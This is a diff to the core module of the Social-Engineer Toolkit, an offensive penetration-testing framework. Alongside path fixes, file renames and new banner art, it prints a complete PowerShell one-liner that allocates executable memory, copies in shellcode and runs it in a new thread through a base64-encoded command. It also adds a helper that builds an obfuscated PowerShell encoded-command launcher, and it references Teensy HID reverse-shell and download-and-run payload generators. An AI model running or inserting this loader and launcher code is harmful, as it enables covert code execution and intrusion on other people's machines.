@@ -342,13 +342,16 @@ def meta_path():
             msf_path = "/pentest/exploitation/metasploit/"
             trigger = 1
 
+        # if we are using just the standard path for msfconsole
         if os.path.isfile("/usr/bin/msfconsole"):
-            msf_path = ""
+            msf_path = "/usr/bin/"
             trigger = 1
+
         # Kali linux bleeding edge should return this in order to work
         if os.path.isfile("/usr/share/metasploit-framework/msfconsole"):
             msf_path = "/usr/share/metasploit-framework/"
             trigger = 1
+
         # if we are using windows
         if check_os() == "windows":
             print_warning(
@@ -674,42 +677,42 @@ def teensy_pde_generator(attack_method):
     # if we are doing the attack vector teensy beef
     if attack_method == "beef":
         # specify the filename
-        filename = open("src/teensy/beef.pde", "r")
-        filewrite = open(setdir + "/reports/beef.pde", "w")
+        filename = open("src/teensy/beef.ino", "r")
+        filewrite = open(setdir + "/reports/beef.ino", "w")
         teensy_string = (
-            "Successfully generated Teensy HID Beef Attack Vector under %s/reports/beef.pde" % (setdir))
+            "Successfully generated Teensy HID Beef Attack Vector under %s/reports/beef.ino" % (setdir))
 
     # if we are doing the attack vector teensy beef
     if attack_method == "powershell_down":
         # specify the filename
-        filename = open("src/teensy/powershell_down.pde", "r")
-        filewrite = open(setdir + "/reports/powershell_down.pde", "w")
+        filename = open("src/teensy/powershell_down.ino", "r")
+        filewrite = open(setdir + "/reports/powershell_down.ino", "w")
         teensy_string = (
-            "Successfully generated Teensy HID Attack Vector under %s/reports/powershell_down.pde" % (setdir))
+            "Successfully generated Teensy HID Attack Vector under %s/reports/powershell_down.ino" % (setdir))
 
     # if we are doing the attack vector teensy
     if attack_method == "powershell_reverse":
         # specify the filename
-        filename = open("src/teensy/powershell_reverse.pde", "r")
-        filewrite = open(setdir + "/reports/powershell_reverse.pde", "w")
+        filename = open("src/teensy/powershell_reverse.ino", "r")
+        filewrite = open(setdir + "/reports/powershell_reverse.ino", "w")
         teensy_string = (
-            "Successfully generated Teensy HID Attack Vector under %s/reports/powershell_reverse.pde" % (setdir))
+            "Successfully generated Teensy HID Attack Vector under %s/reports/powershell_reverse.ino" % (setdir))
 
     # if we are doing the attack vector teensy beef
     if attack_method == "java_applet":
         # specify the filename
-        filename = open("src/teensy/java_applet.pde", "r")
-        filewrite = open(setdir + "/reports/java_applet.pde", "w")
+        filename = open("src/teensy/java_applet.ino", "r")
+        filewrite = open(setdir + "/reports/java_applet.ino", "w")
         teensy_string = (
-            "Successfully generated Teensy HID Attack Vector under %s/reports/java_applet.pde" % (setdir))
+            "Successfully generated Teensy HID Attack Vector under %s/reports/java_applet.ino" % (setdir))
 
     # if we are doing the attack vector teensy
     if attack_method == "wscript":
         # specify the filename
-        filename = open("src/teensy/wscript.pde", "r")
-        filewrite = open(setdir + "/reports/wscript.pde", "w")
+        filename = open("src/teensy/wscript.ino", "r")
+        filewrite = open(setdir + "/reports/wscript.ino", "w")
         teensy_string = (
-            "Successfully generated Teensy HID Attack Vector under %s/reports/wscript.pde" % (setdir))
+            "Successfully generated Teensy HID Attack Vector under %s/reports/wscript.ino" % (setdir))
 
     # All the options share this code except binary2teensy
     if attack_method != "binary2teensy":
@@ -725,7 +728,7 @@ def teensy_pde_generator(attack_method):
         # specify the filename
         import src.teensy.binary2teensy
         teensy_string = (
-            "Successfully generated Teensy HID Attack Vector under %s/reports/binary2teensy.pde" % (setdir))
+            "Successfully generated Teensy HID Attack Vector under %s/reports/binary2teensy.ino" % (setdir))
 
     print_status(teensy_string)
 #
@@ -817,8 +820,8 @@ def show_banner(define_version, graphic):
     print(bcolors.BLUE + """
 [---]        The Social-Engineer Toolkit (""" + bcolors.YELLOW + """SET""" + bcolors.BLUE + """)         [---]
 [---]        Created by:""" + bcolors.RED + """ David Kennedy """ + bcolors.BLUE + """(""" + bcolors.YELLOW + """ReL1K""" + bcolors.BLUE + """)         [---]
-                      Version: """ + bcolors.RED + """%s""" % (define_version) + bcolors.BLUE + """                   
-                  Codename: '""" + bcolors.YELLOW + """Underground""" + bcolors.ENDC + bcolors.BLUE + """'              
+                       Version: """ + bcolors.RED + """%s""" % (define_version) + bcolors.BLUE + """
+                     Codename: '""" + bcolors.YELLOW + """Ghost""" + bcolors.ENDC + bcolors.BLUE + """'
 [---]        Follow us on Twitter: """ + bcolors.PURPLE + """@TrustedSec""" + bcolors.BLUE + """         [---]
 [---]        Follow me on Twitter: """ + bcolors.PURPLE + """@HackingDave""" + bcolors.BLUE + """        [---]
 [---]       Homepage: """ + bcolors.YELLOW + """https://www.trustedsec.com""" + bcolors.BLUE + """       [---]
@@ -866,7 +869,7 @@ def show_banner(define_version, graphic):
 
         # If thread is still active
         if p.is_alive():
-            print(bcolors.RED + " Unable to check for new version of SET (is your network up?)\n" + bcolors.ENDC) 
+            print(bcolors.RED + " Unable to check for new version of SET (is your network up?)\n" + bcolors.ENDC)
             # terminate the process
             p.terminate()
             p.join()
@@ -1060,7 +1063,7 @@ def show_graphic():
            |`;=====' =''     ``=  `-'     `=====''|
            |______________________________________|
 	''')
-    
+
     if menu == 13:
         print(bcolors.RED + r"""
                       ..:::::::::..
@@ -1088,36 +1091,70 @@ def show_graphic():
 
     if menu == 14:
         print(bcolors.BOLD + """
-        cddddddddddddddddddddddddddddddddddddddddddd;
-        0Mo..........':ldkO0KKXXKK0kxoc,..........kMd
-        0Ml......;d0WMMMMMMMMMMMMMMMMMMMWKx:......kMd
-        0Ml...cOWMMMMMMMMMMMMMMMMMMMMMMMMMMMWO:...kMd
-        0Ml.lNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNc.kMd
-        0MdKMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM0OMd
-        0MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMd
-        0MxcxWMMMMMNXXNMMMMMMMMMMMMMMMNXXNMMMMMWkcKMd
-        0Md..lMKo,.,'...:kWMMMMMMMNx;...',.;dXMl.'XMd
-        0Mx'.,O;dXMMMXl....:dWMNo;....oXMMMKd;0,.'KMd
-        0MO;.,NMWMMMMMMWk;...XMK...:OWMMMMMMWMN,.cNMd
-        0MxxNMX;KMMKdcclkWN0WMMMN0WNxc:lxXMMk;WMXdKMd
-        0MMMMMO;MMl.......KMXOMNkMk.......xMM.NMMMMMd
-        0MMMMMMXKoclddl;.oWMdkMN,MN:.:ldolcdXNMMMMMMd   
-        0MMMMMMWXMMMMMMMW0KdoNMMdox0MMMMMMMMXMMMMMMMd
-        0MMMMXc'WMMMMMMMMkcWMMMMMMkcMMMMMMMMN'lXMMMMd
-        0MMMd..cMMMMMMMMNdoKMMMMM0x:XMMMMMMMM:..kMMMd
-        0MM0....d0KKOd:.....c0Kx'.....:d0NX0l....NMMd
-        0MMO.....................................WMMd
-        0Mdkc...................................0kOMd
-        0Ml.:Ol;........';;.......;,........':oX:.kMd
-        0Ml..,WMMMMWWWo...';;:c::;'...:WWMMMMMW;..kMd
-        0Ml...dMMMMMMMMKl...........c0MMMMMMMMd...kMd
-        0Ml...cMMMMMMMMMMMXOxdddk0NMMMMMMMMMMM'...kMd
-        0Ml....KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMO....kMd
-        0Ml.....OMMMMMMMMMMMMMMMMMMMMMMMMMMMK.....kMd
-        0Ml......:XMMMMMMMMMMMMMMMMMMMMMMMNl......kMd
-        0Ml........lXMMMMMMMMMMMMMMMMMMMKc........kMd
-        0Ml..........:KMMMMMMMMMMMMMMM0,..........kMd
-        oO:............xOOOx:'';dOOOOd............lOc""" + bcolors.ENDC)
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+XX                                                                          XX
+XX   MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   XX
+XX   MMMMMMMMMMMMMMMMMMMMMssssssssssssssssssssssssssMMMMMMMMMMMMMMMMMMMMM   XX
+XX   MMMMMMMMMMMMMMMMss'''                          '''ssMMMMMMMMMMMMMMMM   XX
+XX   MMMMMMMMMMMMyy''                                    ''yyMMMMMMMMMMMM   XX
+XX   MMMMMMMMyy''                                            ''yyMMMMMMMM   XX
+XX   MMMMMy''                                                    ''yMMMMM   XX
+XX   MMMy'                                                          'yMMM   XX
+XX   Mh'                                                              'hM   XX
+XX   -                                                                  -   XX
+XX                                                                          XX
+XX   ::                                                                ::   XX
+XX   MMhh.        ..hhhhhh..                      ..hhhhhh..        .hhMM   XX
+XX   MMMMMh   ..hhMMMMMMMMMMhh.                .hhMMMMMMMMMMhh..   hMMMMM   XX
+XX   ---MMM .hMMMMdd:::dMMMMMMMhh..        ..hhMMMMMMMd:::ddMMMMh. MMM---   XX
+XX   MMMMMM MMmm''      'mmMMMMMMMMyy.  .yyMMMMMMMMmm'      ''mmMM MMMMMM   XX
+XX   ---mMM ''             'mmMMMMMMMM  MMMMMMMMmm'             '' MMm---   XX
+XX   yyyym'    .              'mMMMMm'  'mMMMMm'              .    'myyyy   XX
+XX   mm''    .y'     ..yyyyy..  ''''      ''''  ..yyyyy..     'y.    ''mm   XX
+XX           MN    .sMMMMMMMMMss.   .    .   .ssMMMMMMMMMs.    NM           XX
+XX           N`    MMMMMMMMMMMMMN   M    M   NMMMMMMMMMMMMM    `N           XX
+XX            +  .sMNNNNNMMMMMN+   `N    N`   +NMMMMMNNNNNMs.  +            XX
+XX              o+++     ++++Mo    M      M    oM++++     +++o              XX
+XX                                oo      oo                                XX
+XX           oM                 oo          oo                 Mo           XX
+XX         oMMo                M              M                oMMo         XX
+XX       +MMMM                 s              s                 MMMM+       XX
+XX      +MMMMM+            +++NNNN+        +NNNN+++            +MMMMM+      XX
+XX     +MMMMMMM+       ++NNMMMMMMMMN+    +NMMMMMMMMNN++       +MMMMMMM+     XX
+XX     MMMMMMMMMNN+++NNMMMMMMMMMMMMMMNNNNMMMMMMMMMMMMMMNN+++NNMMMMMMMMM     XX
+XX     yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy     XX
+XX   m  yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy  m   XX
+XX   MMm yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy mMM   XX
+XX   MMMm .yyMMMMMMMMMMMMMMMM     MMMMMMMMMM     MMMMMMMMMMMMMMMMyy. mMMM   XX
+XX   MMMMd   ''''hhhhh       odddo          obbbo        hhhh''''   dMMMM   XX
+XX   MMMMMd             'hMMMMMMMMMMddddddMMMMMMMMMMh'             dMMMMM   XX
+XX   MMMMMMd              'hMMMMMMMMMMMMMMMMMMMMMMh'              dMMMMMM   XX
+XX   MMMMMMM-               ''ddMMMMMMMMMMMMMMdd''               -MMMMMMM   XX
+XX   MMMMMMMM                   '::dddddddd::'                   MMMMMMMM   XX
+XX   MMMMMMMM-                                                  -MMMMMMMM   XX
+XX   MMMMMMMMM                                                  MMMMMMMMM   XX
+XX   MMMMMMMMMy                                                yMMMMMMMMM   XX
+XX   MMMMMMMMMMy.                                            .yMMMMMMMMMM   XX
+XX   MMMMMMMMMMMMy.                                        .yMMMMMMMMMMMM   XX
+XX   MMMMMMMMMMMMMMy.                                    .yMMMMMMMMMMMMMM   XX
+XX   MMMMMMMMMMMMMMMMs.                                .sMMMMMMMMMMMMMMMM   XX
+XX   MMMMMMMMMMMMMMMMMMss.           ....           .ssMMMMMMMMMMMMMMMMMM   XX
+XX   MMMMMMMMMMMMMMMMMMMMNo         oNNNNo         oNMMMMMMMMMMMMMMMMMMMM   XX
+XX                                                                          XX
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+
+    .o88o.                               o8o                .
+    888 `"                               `"'              .o8
+   o888oo   .oooo.o  .ooooo.   .ooooo.  oooo   .ooooo.  .o888oo oooo    ooo
+    888    d88(  "8 d88' `88b d88' `"Y8 `888  d88' `88b   888    `88.  .8'
+    888    `"Y88b.  888   888 888        888  888ooo888   888     `88..8'
+    888    o.  )88b 888   888 888   .o8  888  888    .o   888 .    `888'
+   o888o   8""888P' `Y8bod8P' `Y8bod8P' o888o `Y8bod8P'   "888"      d8'
+                                                                .o...P'
+                                                                `XER0'
+""" + bcolors.ENDC)
 
 #
 # identify if set interactive shells are disabled
@@ -1398,7 +1435,8 @@ def generate_powershell_alphanumeric_payload(payload, ipaddr, port, payload2):
     try:
 
         # if not "reverse_http" in payload or not "reverse_https" in payload:
-        shellcode = shellcode_replace(ipaddr, port, shellcode).rstrip()
+        if not "http" in payload:
+	     shellcode = shellcode_replace(ipaddr, port, shellcode).rstrip()
         # sub in \x for 0x
         shellcode = re.sub("\\\\x", "0x", shellcode)
         shellcode = shellcode.replace("\\", "")
@@ -1437,7 +1475,7 @@ def generate_powershell_alphanumeric_payload(payload, ipaddr, port, payload2):
 
     # one line shellcode injection with native x86 shellcode
     powershell_code = (
-        r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-EncodedCommand ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $3 $2 $e"}else{;iex "& powershell $2 $e";}""" % shellcode)
+        r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-e ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $3 $2 $e"}else{;iex "& powershell $2 $e";}""" % shellcode)
 
     # run it through a lame var replace
     powershell_command = powershell_code.replace("$1", "$" + var1).replace(
@@ -1794,7 +1832,7 @@ def get_sql_port(host):
         except: return None
 
     except Exception as err:
-        print str(err)
+        print(err)
         pass
 
 # capture output from a function
@@ -1928,3 +1966,11 @@ def tail(filename):
 
     else:
         print_error("File not found, cannot tail.")
+
+# this will create an obfsucated powershell encoded command string to be used through SET
+def powershell_encodedcommand():
+    ran1 = generate_random_string(1, 2)
+    ran2 = generate_random_string(1, 2)
+    ran3 = generate_random_string(1, 2)
+    ran4 = generate_random_string(1, 2)
+    return 'powershell -w 1 -C "sv %s -;sv %s ec;sv %s ((gv %s).value.toString()+(gv %s).value.toString());powershell (gv %s).value.toString() "' % (ran1, ran2, ran3, ran1, ran2, ran3) 
